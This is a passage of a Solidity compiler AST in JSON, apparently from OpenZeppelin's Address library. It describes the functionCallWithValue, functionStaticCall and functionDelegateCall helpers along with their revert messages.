ns":{"typeIdentifier":"t_bool","typeString":"bool"}},{"hexValue":"416464726573733a20696e73756666696369656e742062616c616e636520666f722063616c6c","id":1291,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"5189:40:5","typeDescriptions":{"typeIdentifier":"t_stringliteral_565f1a77334fc4792800921178c71e4521acffab18ff9e7885b49377ee80ab4c","typeString":"literal_string \"Address: insufficient balance for call\""},"value":"Address: insufficient balance for call"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"},{"typeIdentifier":"t_stringliteral_565f1a77334fc4792800921178c71e4521acffab18ff9e7885b49377ee80ab4c","typeString":"literal_string \"Address: insufficient balance for call\""}],"id":1283,"name":"require","nodeType":"Identifier","overloadedDeclarations":[-18,-18],"referencedDeclaration":-18,"src":"5149:7:5","typeDescriptions":{"typeIdentifier":"t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$","typeString":"function (bool,string memory) pure"}},"id":1292,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"5149:81:5","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":1293,"nodeType":"ExpressionStatement","src":"5149:81:5"},{"assignments":[1295,1297],"declarations":[{"constant":false,"id":1295,"mutability":"mutable","name":"success","nameLocation":"5246:7:5","nodeType":"VariableDeclaration","scope":1312,"src":"5241:12:5","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":1294,"name":"bool","nodeType":"ElementaryTypeName","src":"5241:4:5","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"},{"constant":false,"id":1297,"mutability":"mutable","name":"returndata","nameLocation":"5268:10:5","nodeType":"VariableDeclaration","scope":1312,"src":"5255:23:5","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes"},"typeName":{"id":1296,"name":"bytes","nodeType":"ElementaryTypeName","src":"5255:5:5","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"visibility":"internal"}],"id":1304,"initialValue":{"arguments":[{"id":1302,"name":"data","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1274,"src":"5308:4:5","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}],"expression":{"id":1298,"name":"target","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1272,"src":"5282:6:5","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"id":1299,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"call","nodeType":"MemberAccess","src":"5282:11:5","typeDescriptions":{"typeIdentifier":"t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$","typeString":"function (bytes memory) payable returns (bool,bytes memory)"}},"id":1301,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"names":["value"],"nodeType":"FunctionCallOptions","options":[{"id":1300,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1276,"src":"5301:5:5","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"src":"5282:25:5","typeDescriptions":{"typeIdentifier":"t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$value","typeString":"function (bytes memory) payable returns (bool,bytes memory)"}},"id":1303,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"5282:31:5","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$_t_bool_$_t_bytes_memory_ptr_$","typeString":"tuple(bool,bytes memory)"}},"nodeType":"VariableDeclarationStatement","src":"5240:73:5"},{"expression":{"arguments":[{"id":1306,"name":"target","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1272,"src":"5357:6:5","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":1307,"name":"success","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1295,"src":"5365:7:5","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},{"id":1308,"name":"returndata","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1297,"src":"5374:10:5","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},{"id":1309,"name":"errorMessage","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1278,"src":"5386:12:5","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_bool","typeString":"bool"},{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"},{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}],"id":1305,"name":"verifyCallResultFromTarget","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1444,"src":"5330:26:5","typeDescriptions":{"typeIdentifier":"t_function_internal_view$_t_address_$_t_bool_$_t_bytes_memory_ptr_$_t_string_memory_ptr_$returns$_t_bytes_memory_ptr_$","typeString":"function (address,bool,bytes memory,string memory) view returns (bytes memory)"}},"id":1310,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"5330:69:5","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"functionReturnParameters":1282,"id":1311,"nodeType":"Return","src":"5323:76:5"}]},"documentation":{"id":1270,"nodeType":"StructuredDocumentation","src":"4718:237:5","text":" @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but\n with `errorMessage` as a fallback revert reason when `target` reverts.\n _Available since v3.1._"},"id":1313,"implemented":true,"kind":"function","modifiers":[],"name":"functionCallWithValue","nameLocation":"4969:21:5","nodeType":"FunctionDefinition","parameters":{"id":1279,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1272,"mutability":"mutable","name":"target","nameLocation":"5008:6:5","nodeType":"VariableDeclaration","scope":1313,"src":"5000:14:5","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1271,"name":"address","nodeType":"ElementaryTypeName","src":"5000:7:5","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":1274,"mutability":"mutable","name":"data","nameLocation":"5037:4:5","nodeType":"VariableDeclaration","scope":1313,"src":"5024:17:5","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes"},"typeName":{"id":1273,"name":"bytes","nodeType":"ElementaryTypeName","src":"5024:5:5","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"visibility":"internal"},{"constant":false,"id":1276,"mutability":"mutable","name":"value","nameLocation":"5059:5:5","nodeType":"VariableDeclaration","scope":1313,"src":"5051:13:5","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1275,"name":"uint256","nodeType":"ElementaryTypeName","src":"5051:7:5","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":1278,"mutability":"mutable","name":"errorMessage","nameLocation":"5088:12:5","nodeType":"VariableDeclaration","scope":1313,"src":"5074:26:5","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":1277,"name":"string","nodeType":"ElementaryTypeName","src":"5074:6:5","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"}],"src":"4990:116:5"},"returnParameters":{"id":1282,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1281,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":1313,"src":"5125:12:5","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes"},"typeName":{"id":1280,"name":"bytes","nodeType":"ElementaryTypeName","src":"5125:5:5","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"visibility":"internal"}],"src":"5124:14:5"},"scope":1489,"src":"4960:446:5","stateMutability":"nonpayable","virtual":false,"visibility":"internal"},{"body":{"id":1329,"nodeType":"Block","src":"5683:97:5","statements":[{"expression":{"arguments":[{"id":1324,"name":"target","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1316,"src":"5719:6:5","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":1325,"name":"data","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1318,"src":"5727:4:5","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},{"hexValue":"416464726573733a206c6f772d6c6576656c207374617469632063616c6c206661696c6564","id":1326,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"5733:39:5","typeDescriptions":{"typeIdentifier":"t_stringliteral_90ec82aa826a536a4cbfae44ecfa384680faa9a4b77344bce96aa761ad904df0","typeString":"literal_string \"Address: low-level static call failed\""},"value":"Address: low-level static call failed"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"},{"typeIdentifier":"t_stringliteral_90ec82aa826a536a4cbfae44ecfa384680faa9a4b77344bce96aa761ad904df0","typeString":"literal_string \"Address: low-level static call failed\""}],"id":1323,"name":"functionStaticCall","nodeType":"Identifier","overloadedDeclarations":[1330,1359],"referencedDeclaration":1359,"src":"5700:18:5","typeDescriptions":{"typeIdentifier":"t_function_internal_view$_t_address_$_t_bytes_memory_ptr_$_t_string_memory_ptr_$returns$_t_bytes_memory_ptr_$","typeString":"function (address,bytes memory,string memory) view returns (bytes memory)"}},"id":1327,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"5700:73:5","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"functionReturnParameters":1322,"id":1328,"nodeType":"Return","src":"5693:80:5"}]},"documentation":{"id":1314,"nodeType":"StructuredDocumentation","src":"5412:166:5","text":" @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\n but performing a static call.\n _Available since v3.3._"},"id":1330,"implemented":true,"kind":"function","modifiers":[],"name":"functionStaticCall","nameLocation":"5592:18:5","nodeType":"FunctionDefinition","parameters":{"id":1319,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1316,"mutability":"mutable","name":"target","nameLocation":"5619:6:5","nodeType":"VariableDeclaration","scope":1330,"src":"5611:14:5","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1315,"name":"address","nodeType":"ElementaryTypeName","src":"5611:7:5","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":1318,"mutability":"mutable","name":"data","nameLocation":"5640:4:5","nodeType":"VariableDeclaration","scope":1330,"src":"5627:17:5","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes"},"typeName":{"id":1317,"name":"bytes","nodeType":"ElementaryTypeName","src":"5627:5:5","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"visibility":"internal"}],"src":"5610:35:5"},"returnParameters":{"id":1322,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1321,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":1330,"src":"5669:12:5","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes"},"typeName":{"id":1320,"name":"bytes","nodeType":"ElementaryTypeName","src":"5669:5:5","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"visibility":"internal"}],"src":"5668:14:5"},"scope":1489,"src":"5583:197:5","stateMutability":"view","virtual":false,"visibility":"internal"},{"body":{"id":1358,"nodeType":"Block","src":"6122:168:5","statements":[{"assignments":[1343,1345],"declarations":[{"constant":false,"id":1343,"mutability":"mutable","name":"success","nameLocation":"6138:7:5","nodeType":"VariableDeclaration","scope":1358,"src":"6133:12:5","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":1342,"name":"bool","nodeType":"ElementaryTypeName","src":"6133:4:5","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"},{"constant":false,"id":1345,"mutability":"mutable","name":"returndata","nameLocation":"6160:10:5","nodeType":"VariableDeclaration","scope":1358,"src":"6147:23:5","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes"},"typeName":{"id":1344,"name":"bytes","nodeType":"ElementaryTypeName","src":"6147:5:5","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"visibility":"internal"}],"id":1350,"initialValue":{"arguments":[{"id":1348,"name":"data","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1335,"src":"6192:4:5","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}],"expression":{"id":1346,"name":"target","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1333,"src":"6174:6:5","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"id":1347,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"staticcall","nodeType":"MemberAccess","src":"6174:17:5","typeDescriptions":{"typeIdentifier":"t_function_barestaticcall_view$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$","typeString":"function (bytes memory) view returns (bool,bytes memory)"}},"id":1349,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"6174:23:5","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$_t_bool_$_t_bytes_memory_ptr_$","typeString":"tuple(bool,bytes memory)"}},"nodeType":"VariableDeclarationStatement","src":"6132:65:5"},{"expression":{"arguments":[{"id":1352,"name":"target","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1333,"src":"6241:6:5","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":1353,"name":"success","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1343,"src":"6249:7:5","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},{"id":1354,"name":"returndata","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1345,"src":"6258:10:5","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},{"id":1355,"name":"errorMessage","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1337,"src":"6270:12:5","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_bool","typeString":"bool"},{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"},{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}],"id":1351,"name":"verifyCallResultFromTarget","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1444,"src":"6214:26:5","typeDescriptions":{"typeIdentifier":"t_function_internal_view$_t_address_$_t_bool_$_t_bytes_memory_ptr_$_t_string_memory_ptr_$returns$_t_bytes_memory_ptr_$","typeString":"function (address,bool,bytes memory,string memory) view returns (bytes memory)"}},"id":1356,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"6214:69:5","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"functionReturnParameters":1341,"id":1357,"nodeType":"Return","src":"6207:76:5"}]},"documentation":{"id":1331,"nodeType":"StructuredDocumentation","src":"5786:173:5","text":" @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],\n but performing a static call.\n _Available since v3.3._"},"id":1359,"implemented":true,"kind":"function","modifiers":[],"name":"functionStaticCall","nameLocation":"5973:18:5","nodeType":"FunctionDefinition","parameters":{"id":1338,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1333,"mutability":"mutable","name":"target","nameLocation":"6009:6:5","nodeType":"VariableDeclaration","scope":1359,"src":"6001:14:5","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1332,"name":"address","nodeType":"ElementaryTypeName","src":"6001:7:5","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":1335,"mutability":"mutable","name":"data","nameLocation":"6038:4:5","nodeType":"VariableDeclaration","scope":1359,"src":"6025:17:5","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes"},"typeName":{"id":1334,"name":"bytes","nodeType":"ElementaryTypeName","src":"6025:5:5","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"visibility":"internal"},{"constant":false,"id":1337,"mutability":"mutable","name":"errorMessage","nameLocation":"6066:12:5","nodeType":"VariableDeclaration","scope":1359,"src":"6052:26:5","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":1336,"name":"string","nodeType":"ElementaryTypeName","src":"6052:6:5","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"}],"src":"5991:93:5"},"returnParameters":{"id":1341,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1340,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":1359,"src":"6108:12:5","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes"},"typeName":{"id":1339,"name":"bytes","nodeType":"ElementaryTypeName","src":"6108:5:5","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"visibility":"internal"}],"src":"6107:14:5"},"scope":1489,"src":"5964:326:5","stateMutability":"view","virtual":false,"visibility":"internal"},{"body":{"id":1375,"nodeType":"Block","src":"6566:101:5","statements":[{"expression":{"arguments":[{"id":1370,"name":"target","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1362,"src":"6604:6:5","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":1371,"name":"data","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1364,"src":"6612:4:5","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},{"hexValue":"416464726573733a206c6f772d6c6576656c2064656c65676174652063616c6c206661696c6564","id":1372,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"6618:41:5","typeDescriptions":{"typeIdentifier":"t_stringliteral_9fdcd12e4b726339b32a442b0a448365d5d85c96b2d2cff917b4f66c63110398","typeString":"literal_string \"Address: low-level delegate call failed\""},"value":"Address: low-level delegate call failed"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"},{"typeIdentifier":"t_stringliteral_9fdcd12e4b726339b32a442b0a448365d5d85c96b2d2cff917b4f66c63110398","typeString":"literal_string \"Address: low-level delegate call failed\""}],"id":1369,"name":"functionDelegateCall","nodeType":"Identifier","overloadedDeclarations":[1376,1405],"referencedDeclaration":1405,"src":"6583:20:5","typeDescriptions":{"typeIdentifier":"t_function_internal_nonpayable$_t_address_$_t_bytes_memory_ptr_$_t_string_memory_ptr_$returns$_t_bytes_memory_ptr_$","typeString":"function (address,bytes memory,string memory) returns (bytes memory)"}},"id":1373,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"6583:77:5","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"functionReturnParameters":1368,"id":1374,"nodeType":"Return","src":"6576:84:5"}]},"documentation":{"id":1360,"nodeType":"StructuredDocumentation","src":"6296:168:5","text":" @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\n but performing a delegate call.\n _Available since v3.4._"},"id":1376,"implemented":true,"kind":"function","modifiers":[],"name":"functionDelegateCall","nameLocation":"6478:20:5","nodeType":"FunctionDefinition","parameters":{"id":1365,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1362,"mutability":"mutable","name":"target","nameLocation":"6507:6:5","nodeType":"VariableDeclaration","scope":1376,"src":"6499:14:5","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1361,"name":"address","nodeType":"ElementaryTypeName","src":"6499:7:5","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":1364,"mutability":"mutable","name":"data","nameLocation":"6528:4:5","nodeType":"VariableDeclaration","scope":1376,"src":"6515:17:5","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes"},"typeName":{"id":1363,"name":"bytes","nodeType":"ElementaryTypeName","src":"6515:5:5","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"visibility":"internal"}],"src":"6498:35:5"},"returnParameters":{"id":1368,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1367,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":1376,"src":"6552:12:5","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes"},"typeName":{"id":1366,"name":"bytes","nodeType":"ElementaryTypeName","src":"6552:5:5","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"visibility":"internal"}],"src":"6551:14:5"},"scope":1489,"src":"6469:198:5","stateMutability":"nonpayable","virtual":false,"visibility":"internal"},{"body":{"id":1404,"nodeType":"Block","src":"7008:170:5","statements":[{"assignments":[1389,1391],"declarations":[{"constant":false,"id":1389,"mutability":"mutable","name":"success","nameLocation":"7024:7:5","nodeType":"VariableDeclaration","scope":1404,"src":"7019:12:5","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":1388,"name":"bool","nodeType":"ElementaryTypeName","src":"7019:4:5","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"},{"constant":false,"id":1391,"mutability":"mutable","name":"returndata","nameLocation":"7046:10:5","nodeType":"VariableDeclaration","scope":1404,"src":"7033:23:5","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes"},"typeName":{"id":1390,"name":"bytes","nodeType":"ElementaryTypeName","src":"7033:5:5","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"visibility":"internal"}],"id":1396,"initialValue":{"arguments":[{"id":1394,"name":"data","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1381,"src":"7080:4:5","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}],"expression":{"id":1392,"name":"target","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1379,"src":"7060:6:5","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"id":1393,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"delegatecall","nodeType":"MemberAccess","src":"7060:19:5","typeDescriptions":{"typeIdentifier":"t_function_baredelegatecall_nonpayable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$","typeString":"function (bytes memory) returns (bool,bytes memory)"}},"id":1395,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"7060:25:5","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$_t_bool_$_t_bytes_memory_ptr_$","typeString":"tuple(bool,bytes memory)"}},"nodeType":"VariableDeclarationStatement","src":"7018:67:5"},{"expression":{"arguments":[{"id":1398,"name":"target","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1379,"src":"7129:6:5","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":1399,"name":"success","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1389,"src":"7137:7:5","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},{"id":1400,"name":"returndata","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1391,"src":"7146:10:5","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},{"id":1401,"name":"errorMessage","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1383,"src":"7158:12:5","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_bool","typeString":"bool"},{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"},{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}],"id":1397,"name":"verifyCallResultFromTarget","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1444,"src":"7102:26:5","typeDescriptions":{"typeIdentifier":"t_function_internal_view$_t_address_$_t_bool_$_t_bytes_memory_ptr_$_t_string_memory_ptr_$returns$_t_bytes_memory_ptr_$","typeString":"function (address,bool,bytes memory,string memory) view returns (bytes memory)"}},"id":1402,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"7102:69:5","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"functionReturnParameters":1387,"id":1403,"nodeType":"Return","src":"7095:76:5"}]},"documentation":{"id":1377,"nodeType":"StructuredDocumentation","src":"6673:175:5","text":" @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],\n but performing a delegate call.\n _Available since v3.4._"},"id":1405,"implemented":true,"kind":"function","modifiers":[],"name":"functionDelegateCall","nameLocation":"6862:20:5","nodeType":"FunctionDefinition","parameters":{"id":1384,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1379,"mutability":"mutable","name":"target","nameLocation":"6900:6:5","nodeType":"VariableDeclaration","scope":1405,"src":"6892:14:5","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1378,"name":"address","nodeType":"ElementaryTypeName","src":"6892:7:5","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":1381,"mutability":"mutable","name":"data","nameLocation":"6929:4:5","nodeType":"VariableDeclaration","scope":1405,"src":"6916:17:5","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes"},"typeName":{"id":1380,"name":"bytes","nodeType":"ElementaryTypeName","src":"6916:5:5","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"visibility":"internal"},{"constant":false,"id":1383,"mutability":"mutable","name":"errorMessage","nameLocation":"6957:12:5","nodeType":"VariableDeclaration","scope":1405,"src":"6943:26:5","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":1382,"name":"string","nodeType":"ElementaryTypeName","src":"6943:6:5","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"}],"src":"6882:93:5"},"returnParameters":{"id":1387,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1386,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":1405,"src":"6994:12:5","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes"},"typeName":{"id":1385,"name":"bytes","nodeType":"ElementaryTypeName","src":"6994:5:5","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"visibility":"internal"}],"src":"6993:14:5"},"scope":1489,"src":"6853:325:5","stateMutability":"nonpayable","virtual":false,"visibility":"internal"},{"body":{"id":1443,"nodeType":"Block","src":"7660:434:5","statements":[{"condition":{"id":1419,"name":"success","nodeType":"Identifier","